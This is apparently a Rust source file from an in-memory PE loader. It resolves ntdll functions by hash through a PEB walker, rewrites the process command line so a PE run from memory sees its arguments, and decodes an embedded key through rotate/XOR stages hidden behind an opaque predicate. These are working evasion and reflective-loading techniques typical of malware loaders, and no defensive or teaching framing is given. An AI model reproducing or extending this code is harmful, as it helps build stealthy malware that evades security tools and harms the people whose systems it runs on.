use crate::walker::{current_peb, get_export, get_module_base};
use core::ffi::c_void;
use core::ptr::{copy_nonoverlapping, null_mut};
use ntapi::ntpebteb::PEB;
use std::cell::Cell;
use winapi::um::winnt::HANDLE;

#[repr(C)]
pub struct ProcessParametersStore {
    pub commandline_len_orig: u16,
    pub commandline_max_orig: u16,
    pub commandline_ptr_orig: *mut u16,
}

pub fn fix_args(store: *mut ProcessParametersStore, in_mem_pe_args: *const i8) {
    unsafe {
        let ntdll = get_module_base(0x55c55c01);
        type NtAlloc =
            extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
        let nt_alloc: NtAlloc = core::mem::transmute(get_export(ntdll, 0x6511db12).unwrap());
        let peb = current_peb();
        let params = (*peb).ProcessParameters;
        (*store).commandline_len_orig = (*params).CommandLine.Length;
        (*store).commandline_max_orig = (*params).CommandLine.MaximumLength;
        (*store).commandline_ptr_orig = (*params).CommandLine.Buffer;
        if in_mem_pe_args.is_null() {
            (*params).CommandLine.Length = 0;
            return;
        }
        let mut args_len = 0usize;
        while *in_mem_pe_args.add(args_len) != 0 {
            args_len += 1;
        }
        let full_path_ptr = (*params).ImagePathName.Buffer;
        let full_path_len = (*params).ImagePathName.Length as usize / 2;
        let mut name_start_idx = 0;
        for i in (0..full_path_len).rev() {
            let c = *full_path_ptr.add(i);
            if c == '\\' as u16 || c == '/' as u16 {
                name_start_idx = i + 1;
                break;
            }
        }
        let exe_name_ptr = full_path_ptr.add(name_start_idx);
        let exe_name_len = full_path_len - name_start_idx;
        let new_len_bytes = 2 + (exe_name_len * 2) + 2 + (args_len * 2);
        let alloc_size = new_len_bytes + 2;
        let mut new_buf: *mut c_void = null_mut();
        let mut size = alloc_size;
        nt_alloc(-1isize as _, &mut new_buf, 0, &mut size, 0x3000, 0x04);
        let wbuf = new_buf as *mut u16;
        core::ptr::write_bytes(new_buf, 0, alloc_size);
        *wbuf = '"' as u16;
        copy_nonoverlapping(exe_name_ptr, wbuf.add(1), exe_name_len);
        *wbuf.add(1 + exe_name_len) = '"' as u16;
        *wbuf.add(2 + exe_name_len) = ' ' as u16;
        let mut i = 0usize;
        while *in_mem_pe_args.add(i) != 0 {
            *wbuf.add(3 + exe_name_len + i) = *in_mem_pe_args.add(i) as u8 as u16;
            i += 1;
        }
        (*params).CommandLine.Buffer = wbuf;
        (*params).CommandLine.Length = new_len_bytes as u16;
        (*params).CommandLine.MaximumLength = alloc_size as u16;
    }
}

pub fn restore_args(store: *mut ProcessParametersStore) {
    unsafe {
        let ntdll = get_module_base(0x55c55c01);
        type NtFree = extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32) -> i32;
        let nt_free: NtFree = core::mem::transmute(get_export(ntdll, 0x9d4289b).unwrap());
        let peb: *mut PEB;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        let params = (*peb).ProcessParameters;
        let mut current_buf = (*params).CommandLine.Buffer as *mut c_void;
        let mut size = 0usize;
        (*params).CommandLine.Buffer = (*store).commandline_ptr_orig;
        (*params).CommandLine.Length = (*store).commandline_len_orig;
        (*params).CommandLine.MaximumLength = (*store).commandline_max_orig;
        if !current_buf.is_null() && current_buf != (*store).commandline_ptr_orig as *mut c_void {
            nt_free(-1isize as _, &mut current_buf, &mut size, 0x8000);
        }
    }
}

pub fn prepare_32_byte_array(input: &[u8]) -> [u8; 32] {
    let mut key = [0u8; 32];
    let bytes = input;
    for i in 0..32 {
        if i < bytes.len() {
            key[i] = bytes[i];
        } else {
            key[i] = (i as u8).wrapping_add(0x55);
        }
    }
    key
}

#[inline(always)]
fn rotl(v: u8, r: u8) -> u8 {
    (v << r) | (v >> (8 - r))
}

#[inline(always)]
fn rotr(v: u8, r: u8) -> u8 {
    (v >> r) | (v << (8 - r))
}

#[inline(never)]
fn stage_a(x: u8, k: u8) -> u8 {
    rotl(x ^ k, 3).wrapping_add(19)
}

#[inline(never)]
fn stage_b(x: u8, k: u8) -> u8 {
    rotr(x.wrapping_sub(7) ^ k, 2)
}

#[inline(never)]
fn opaque(x: u8) -> u8 {
    let y = Cell::new(x);
    if (y.get().wrapping_mul(y.get())) & 1 == 0 {
        y.get() ^ 0x5A
    } else {
        y.get() ^ 0x5A
    }
}

pub fn key_bytes() -> Vec<u8> {
    let blob: [u8; 25] = [
        209, 63, 225, 121, 100, 155, 231, 70, 152, 186, 175, 238, 56, 221, 179, 255, 192, 6, 224,
        128, 66, 214, 124, 246, 241,
    ];
    let key1: [u8; 25] = [
        1, 28, 209, 23, 202, 155, 185, 87, 219, 187, 15, 125, 219, 103, 35, 103, 74, 236, 146, 104,
        98, 249, 234, 84, 186,
    ];
    let key2: [u8; 25] = [
        110, 240, 52, 210, 253, 214, 4, 183, 139, 177, 180, 63, 162, 111, 167, 206, 192, 206, 81,
        254, 153, 106, 192, 90, 110,
    ];

    let mut out = [0u8; 25];
    let mut state: u8 = 253;

    for i in 0..25 {
        let mut v = blob[i];

        match state & 3 {
            0 => v = stage_a(v, key1[i]),
            1 => v = stage_b(v, key2[i]),
            2 => v = stage_b(stage_a(v, key1[i]), key2[i]),
            _ => v = stage_a(stage_b(v, key2[i]), key1[i]),
        }

        v = opaque(v);
        out[i] = v;
        state = rotl(state ^ v, 1);
    }

    out.to_vec()
}
